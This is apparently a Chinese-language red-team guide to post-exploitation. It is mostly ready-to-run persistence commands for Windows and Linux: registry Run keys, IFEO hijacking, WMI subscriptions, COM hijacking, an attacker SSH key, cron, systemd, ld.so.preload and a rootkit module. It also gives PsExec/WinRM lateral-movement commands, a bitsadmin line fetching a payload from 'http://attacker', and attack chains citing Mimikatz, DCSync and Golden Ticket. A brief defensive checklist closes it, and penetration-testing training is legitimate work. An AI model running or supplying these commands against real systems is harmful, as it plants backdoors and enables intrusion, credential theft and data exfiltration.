## 1. 后渗透操作概述

### 1.1 后渗透阶段定义

后渗透（Post-Exploitation）是指在成功获取目标系统初始访问权限后，为达成攻击目标而执行的一系列操作。后渗透阶段是渗透测试和红队演练中最重要的环节之一。

```
渗透测试完整流程：

1. 信息收集
   ├── 被动信息收集
   └── 主动信息收集

2. 漏洞发现
   ├── 漏洞扫描
   └── 漏洞验证

3. 漏洞利用 (Exploitation)
   ├── 初始访问获取
   └── 权限获取

4. 后渗透 (Post-Exploitation) ←─── 本文档重点
   ├── 权限提升
   ├── 持久化维持
   ├── 横向移动
   ├── 凭证收集
   ├── 数据收集
   ├── 数据外传
   └── 痕迹清理

5. 报告编写
   ├── 发现汇总
   ├── 风险评级
   └── 修复建议
```

### 1.3 后渗透操作原则

```
后渗透操作核心原则：

1. 最小影响原则
   - 尽量减少对目标系统的影响
   - 避免不必要的系统更改
   - 谨慎使用破坏性操作

2. 隐蔽性原则
   - 尽量减少日志记录
   - 使用加密通信
   - 避免触发安全告警

3. 持久性原则
   - 建立多个持久化点
   - 分散C2通信通道
   - 准备备用访问方案

4. 可控性原则
   - 所有操作可回滚
   - 记录所有变更
   - 保留清理能力

5. 合规性原则
   - 在授权范围内操作
   - 不超出测试范围
   - 遵守法律法规
```

#### Windows持久化实现

```bash
# 1. 注册表Run键持久化
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Users\Public\update.exe" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Users\Public\update.exe" /f

# 2. 注册表RunOnce键持久化
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Update /t REG_SZ /d "C:\Users\Public\update.exe" /f

# 3. Winlogon持久化
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "userinit.exe,C:\Users\Public\update.exe" /f

# 4. Image File Execution Options (IFEO) 持久化
# 当目标程序运行时，实际运行我们的程序
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Users\Public\update.exe" /f

# 5. 创建Windows服务持久化
sc create "SystemService" binPath= "C:\Users\Public\service.exe" start= auto
sc description "SystemService" "System Background Service"
sc start "SystemService"

# 6. 计划任务持久化
schtasks /create /tn "SystemUpdate" /tr "C:\Users\Public\update.exe" /sc onlogon /rl highest /f
schtasks /create /tn "SystemCheck" /tr "C:\Users\Public\check.exe" /sc minute /mo 30 /f

# 7. 启动文件夹持久化
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# 8. WMI永久事件订阅持久化
# 创建事件消费者
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="SystemUpdate", CommandLineTemplate="cmd /c C:\Users\Public\update.exe"

# 创建事件过滤器
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="SystemFilter", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime > 240", QueryLanguage="WQL"

# 绑定消费者和过滤器
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"SystemFilter\"", Consumer="CommandLineEventConsumer.Name=\"SystemUpdate\""

# 9. BITS任务持久化 (后台智能传输服务)
bitsadmin /create SystemUpdate
bitsadmin /addfile SystemUpdate http://attacker/payload.exe C:\Users\Public\update.exe
bitsadmin /SetNotifyCmdLine SystemUpdate cmd.exe "C:\Users\Public\update.exe"
bitsadmin /resume SystemUpdate

# 10. COM劫持持久化
# 修改CLSID指向恶意DLL
reg add "HKCU\Software\Classes\CLSID\{CLSID}\InProcServer32" /ve /t REG_SZ /d "C:\Users\Public\evil.dll" /f
```

#### Linux持久化实现

```bash
# 1. .bashrc持久化
echo '/usr/bin/update &>/dev/null &' >> ~/.bashrc
echo 'nohup /tmp/.update &>/dev/null &' >> ~/.bash_profile

# 2. SSH密钥持久化
mkdir -p ~/.ssh
echo "ssh-rsa AAAA... attacker@host" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# 3. Cron任务持久化
(crontab -l 2>/dev/null; echo "*/30 * * * * /tmp/.update") | crontab -
echo "*/30 * * * * root /tmp/.update" >> /etc/crontab

# 4. systemd服务持久化
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/update
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable system-update.service
systemctl start system-update.service

# 5. /etc/rc.local持久化
echo "/usr/bin/update &" >> /etc/rc.local
chmod +x /etc/rc.local

# 6. PAM后门持久化
# 修改PAM认证模块，添加后门口令
# 需要修改 /etc/pam.d/system-auth 或 /etc/pam.d/common-auth

# 7. LD_PRELOAD持久化
echo "/tmp/.preload.so" >> /etc/ld.so.preload

# 8. 内核模块持久化
# 创建LKM rootkit
insmod /tmp/.module.ko
echo ".module" >> /etc/modules
```

#### 横向移动命令示例

```bash
# 1. PsExec横向移动
psexec \\target -u DOMAIN\user -p password cmd.exe
psexec \\target -u DOMAIN\user -p password -s cmd.exe  # SYSTEM权限

# 2. WinRM/PowerShell远程
Enter-PSSession -ComputerName target -Credential DOMAIN\user
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential DOMAIN\user
```

### 10.2 典型攻击场景

```
场景1: 从Web应用到域控

1. 外部Web应用SQL注入
   → 获取数据库凭证
   → 获取应用服务器Shell

2. 内网信息收集
   → 发现域环境
   → 定位域控

3. 本地提权
   → 发现未修补漏洞
   → SYSTEM权限

4. 凭证收集
   → Mimikatz获取域用户凭证
   → 发现管理员会话

5. 横向移动
   → PsExec访问其他服务器
   → 发现开发环境

6. 获取域管凭证
   → 发现配置文件中域管密码
   → 或Kerberoasting破解

7. 攻击域控
   → DCSync获取所有哈希
   → Golden Ticket

8. 持久化
   → WMI事件订阅
   → 多台主机后门


场景2: 钓鱼到数据外传

1. 钓鱼邮件
   → Office宏执行
   → PowerShell下载器

2. 内存执行
   → 反射加载ShellCode
   → 无文件Beacon

3. 信息收集
   → 发现文件服务器
   → 发现数据库服务器

4. 凭证窃取
   → 浏览器密码
   → 配置文件密码

5. 横向移动
   → WinRM远程执行
   → 访问文件服务器

6. 数据收集
   → 发现敏感文档
   → 压缩打包

7. 数据外传
   → HTTPS外传
   → 或云存储外传

8. 持久化
   → 计划任务后门
   → 注册表后门
```

### 10.3 防御建议总结

```
后渗透防御重点：

1. 减少攻击面
   - 及时修补漏洞
   - 最小权限原则
   - 关闭不必要服务
   - 网络分段

2. 加强凭证管理
   - 密码策略强化
   - 特权账户管控
   - 定期更换密码
   - 禁止密码复用
   - 启用LAPS

3. 加强监控
   - 启用Sysmon
   - 配置EDR
   - SIEM关联分析
   - 异常行为告警

4. 快速响应
   - 应急响应流程
   - 取证能力建设
   - 自动化响应
   - 威胁情报集成

5. 安全意识
   - 安全培训
   - 钓鱼模拟
   - 报告机制
   - 红蓝对抗演练
```
